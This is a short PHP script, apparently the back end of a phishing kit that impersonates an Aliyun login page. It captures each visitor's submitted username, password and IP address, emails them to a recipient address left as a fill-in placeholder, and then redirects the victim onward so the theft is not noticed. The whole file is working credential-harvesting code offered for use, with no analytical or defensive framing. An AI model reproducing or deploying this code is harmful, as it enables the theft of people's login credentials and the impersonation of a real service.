<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Email ID *: ".$_POST['username']."\n";
$message .= "Password*: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$login = $_POST['username'];


$recipient = "youremail@gmail.com";
$sender = 'aly2222@126.com';
$headers .= "From: Aliyun 2<$sender>\n";
$subject = "Aliyun 2";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: index3.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }